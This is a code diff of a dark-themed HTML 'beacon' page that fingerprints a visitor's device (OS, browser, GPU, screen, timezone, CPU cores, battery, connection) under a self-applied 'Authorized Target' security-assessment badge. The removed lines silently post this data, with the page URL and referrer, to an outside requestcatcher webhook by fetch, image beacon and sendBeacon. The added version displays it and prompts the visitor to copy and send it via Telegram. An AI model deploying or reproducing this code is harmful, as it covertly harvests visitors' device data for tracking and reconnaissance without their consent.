@@ -7,103 +7,100 @@
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
 body { font-family: -apple-system, 'Segoe UI', sans-serif; background: #0d1117; color: #c9d1d9; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 2rem; }
-.card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 2.5rem; max-width: 500px; width: 100%; text-align: center; }
-h1 { color: #58a6ff; font-size: 1.5rem; margin-bottom: 0.5rem; }
-.badge { display: inline-block; background: #1f6feb22; color: #58a6ff; border: 1px solid #1f6feb44; border-radius: 20px; padding: 0.25rem 0.75rem; font-size: 0.75rem; margin-bottom: 1.5rem; }
-.status { background: #21262d; border-radius: 8px; padding: 1rem; margin: 1rem 0; font-size: 0.9rem; }
-.row { display: flex; justify-content: space-between; padding: 0.4rem 0; border-bottom: 1px solid #30363d22; font-size: 0.85rem; }
-.row:last-child { border-bottom: none; }
-.lbl { color: #8b949e; } .val { color: #c9d1d9; font-family: monospace; }
-.prog { width: 100%; height: 4px; background: #21262d; border-radius: 2px; margin: 1rem 0; overflow: hidden; }
-.fill { height: 100%; width: 0%; background: linear-gradient(90deg, #58a6ff, #7ee787); animation: scan 2s ease-in-out infinite; }
-@keyframes scan { 0%{width:0%;margin-left:0} 50%{width:60%} 100%{width:0%;margin-left:100%} }
-.ft { color: #484f58; font-size: 0.7rem; margin-top: 1.5rem; }
-.sent { color: #7ee787; font-size: 0.9rem; margin-top: 0.5rem; }
+.card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 2rem; max-width: 500px; width: 100%; }
+h1 { color: #58a6ff; font-size: 1.3rem; margin-bottom: 0.5rem; text-align: center; }
+.badge { display: block; text-align: center; background: #1f6feb22; color: #58a6ff; border: 1px solid #1f6feb44; border-radius: 20px; padding: 0.25rem 0.75rem; font-size: 0.75rem; margin: 0 auto 1rem; width: fit-content; }
+.row { display: flex; justify-content: space-between; padding: 0.5rem 0; border-bottom: 1px solid #30363d22; font-size: 0.9rem; }
+.lbl { color: #8b949e; } .val { color: #7ee787; font-family: monospace; text-align: right; }
+#result { background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 0.8rem; margin: 1rem 0; font-family: monospace; font-size: 0.75rem; color: #c9d1d9; word-break: break-all; line-height: 1.5; display: none; }
+#copyBtn { background: #238636; color: white; border: none; border-radius: 6px; padding: 0.6rem 1.2rem; font-size: 0.9rem; cursor: pointer; width: 100%; margin-top: 0.5rem; display: none; }
+#copyBtn:active { background: #2ea043; }
+.ft { color: #484f58; font-size: 0.7rem; text-align: center; margin-top: 1.5rem; }
+.instructions { background: #1f6feb11; border: 1px solid #1f6feb33; border-radius: 8px; padding: 0.8rem; margin: 1rem 0; font-size: 0.8rem; color: #58a6ff; text-align: center; }
 </style>
 </head>
 <body>
 <div class="card">
 <div class="badge">Security Assessment • Authorized Target</div>
-<h1>Beacon Received</h1>
-<p style="color:#8b949e;font-size:0.9rem;margin-bottom:1rem;">Capturing device fingerprint...</p>
-<div class="prog"><div class="fill"></div></div>
-<div class="status" id="info">Collecting data...</div>
-<div class="row"><span class="lbl">Device</span><span class="val" id="dv">--</span></div>
-<div class="row"><span class="lbl">OS</span><span class="val" id="os">--</span></div>
-<div class="row"><span class="lbl">Browser</span><span class="val" id="br">--</span></div>
-<div class="row"><span class="lbl">Screen</span><span class="val" id="sc">--</span></div>
-<div class="row"><span class="lbl">Language</span><span class="val" id="lang">--</span></div>
-<div class="row"><span class="lbl">Time Zone</span><span class="val" id="tz">--</span></div>
-<div class="row"><span class="lbl">CPU Cores</span><span class="val" id="cpu">--</span></div>
-<div class="row"><span class="lbl">GPU</span><span class="val" id="gpu">--</span></div>
-<div class="row"><span class="lbl">Battery</span><span class="val" id="bat">--</span></div>
-<div class="ft">el psy kongroo • authorized security assessment</div>
+<h1>Beacon Captured</h1>
+<div class="instructions">Tap the button below to copy your device fingerprint and send it in Telegram</div>
+<div class="row"><span class="lbl">Device</span><span class="val" id="dv">detecting...</span></div>
+<div class="row"><span class="lbl">OS Version</span><span class="val" id="os">detecting...</span></div>
+<div class="row"><span class="lbl">Browser</span><span class="val" id="br">detecting...</span></div>
+<div class="row"><span class="lbl">Screen</span><span class="val" id="sc">detecting...</span></div>
+<div class="row"><span class="lbl">Language</span><span class="val" id="lang">detecting...</span></div>
+<div class="row"><span class="lbl">Time Zone</span><span class="val" id="tz">detecting...</span></div>
+<div class="row"><span class="lbl">CPU Cores</span><span class="val" id="cpu">detecting...</span></div>
+<div class="row"><span class="lbl">GPU</span><span class="val" id="gpu">detecting...</span></div>
+<div class="row"><span class="lbl">Battery</span><span class="val" id="bat">detecting...</span></div>
+<div id="result"></div>
+<button id="copyBtn" onclick="copyData()">Copy & Send to Telegram</button>
+<div class="ft">el psy kongroo</div>
 </div>
 <script>
 (function(){
-const WEBHOOK = "https://mirai-beacon.requestcatcher.com/beacon";
 const ua = navigator.userAgent;
 let device = 'Unknown', os = 'Unknown';
 if (/iPhone/.test(ua)) { device = 'iPhone'; os = 'iOS ' + (ua.match(/iPhone OS (\d+[._]\d+)/)?.[1]?.replace('_','.')||''); }
 else if (/iPad/.test(ua)) { device = 'iPad'; os = 'iPadOS'; }
-else if (/Android/.test(ua)) { device = 'Android'; os = 'Android'; }
+else if (/Android/.test(ua)) { device = 'Android'; os = 'Android ' + (ua.match(/Android (\d+[._]\d+)/)?.[1]||''); }
 else if (/Mac/.test(ua)) { device = 'Mac'; os = 'macOS'; }
+else if (/Windows/.test(ua)) { device = 'Windows PC'; os = 'Windows'; }
+
 let browser = 'Unknown';
 if (/CriOS/.test(ua)) browser = 'Chrome iOS';
 else if (/FxiOS/.test(ua)) browser = 'Firefox iOS';
-else if (/EdgiOS|Edg/.test(ua)) browser = 'Edge';
+else if (/Edg/.test(ua)) browser = 'Edge';
+else if (/OPiOS/.test(ua)) browser = 'Opera iOS';
 else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
+else if (/Chrome/.test(ua)) browser = 'Chrome';
 
 const webgl = (()=>{ try { const c = document.createElement('canvas'); const g = c.getContext('webgl')||c.getContext('experimental-webgl'); return g ? g.getParameter(g.RENDERER) : 'N/A'; } catch(e){ return 'Error'; } })();
+const conn = navigator.connection || {};
+const lang = navigator.language || navigator.userLanguage || 'unknown';
+
 document.getElementById('dv').textContent = device;
 document.getElementById('os').textContent = os;
 document.getElementById('br').textContent = browser;
-document.getElementById('sc').textContent = screen.width + 'x' + screen.height;
-document.getElementById('lang').textContent = navigator.language;
+document.getElementById('sc').textContent = screen.width + 'x' + screen.height + ' (' + screen.colorDepth + 'bit)';
+document.getElementById('lang').textContent = lang;
 document.getElementById('tz').textContent = Intl.DateTimeFormat().resolvedOptions().timeZone;
 document.getElementById('cpu').textContent = navigator.hardwareConcurrency || 'N/A';
 document.getElementById('gpu').textContent = webgl;
-if (navigator.getBattery) { navigator.getBattery().then(b => { document.getElementById('bat').textContent = Math.round(b.level*100) + '%' + (b.charging ? ' CHARGING' : ''); }); }
 
-const data = {
-  ua: ua, device: device, os: os, browser: browser,
-  screen: screen.width + 'x' + screen.height,
-  language: navigator.language,
-  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-  cores: navigator.hardwareConcurrency,
-  gpu: webgl, timestamp: new Date().toISOString(),
-  connection: (navigator.connection||{}).effectiveType || 'N/A',
-  referrer: document.referrer || 'direct',
-  url: window.location.href
-};
+if (navigator.getBattery) {
+  navigator.getBattery().then(b => {
+    document.getElementById('bat').textContent = Math.round(b.level*100) + '%' + (b.charging ? ' (charging)' : '');
+  });
+}
 
-document.getElementById('info').textContent = 'Sending...';
+// Build the message
+var msg = 'BEACON DATA:\nDevice: ' + device + '\nOS: ' + os + '\nBrowser: ' + browser + '\nScreen: ' + screen.width + 'x' + screen.height + '\nLanguage: ' + lang + '\nTimezone: ' + Intl.DateTimeFormat().resolvedOptions().timeZone + '\nCPU Cores: ' + (navigator.hardwareConcurrency || 'N/A') + '\nGPU: ' + webgl + '\nConnection: ' + (conn.effectiveType || 'N/A') + '\nTimestamp: ' + new Date().toISOString();
 
-// Try fetch first
-fetch(WEBHOOK, {
-  method: 'POST',
-  mode: 'no-cors',
-  headers: { 'Content-Type': 'application/json' },
-  body: JSON.stringify(data)
-}).then(function(){ 
-  document.getElementById('info').textContent = 'Data transmitted';
-  document.getElementById('info').innerHTML += '<div class="sent">Captured. Device fingerprinted.</div>';
-}).catch(function(){
-  document.getElementById('info').textContent = 'Data sent (async)';
-});
-
-// Also try image beacon (no CORS issues)
-try {
-  var img = new Image();
-  img.src = WEBHOOK + '?d=' + encodeURIComponent(JSON.stringify(data));
-} catch(e){}
-
-// Try sendBeacon as backup
-try {
-  var blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
-  navigator.sendBeacon(WEBHOOK, blob);
-} catch(e){}
+document.getElementById('result').style.display = 'block';
+document.getElementById('result').textContent = msg;
+document.getElementById('copyBtn').style.display = 'block';
 })();
+
+function copyData() {
+  var text = document.getElementById('result').textContent;
+  if (navigator.clipboard && navigator.clipboard.writeText) {
+    navigator.clipboard.writeText(text).then(function(){
+      document.getElementById('copyBtn').textContent = 'Copied! Now paste in Telegram';
+      document.getElementById('copyBtn').style.background = '#1f6feb';
+      setTimeout(function(){ document.getElementById('copyBtn').textContent = 'Copy & Send to Telegram'; document.getElementById('copyBtn').style.background = '#238636'; }, 3000);
+    });
+  } else {
+    // Fallback for older iOS
+    var ta = document.createElement('textarea');
+    ta.value = text;
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+    document.getElementById('copyBtn').textContent = 'Copied! Now paste in Telegram';
+  }
+}
 </script>
 </body>
 </html>
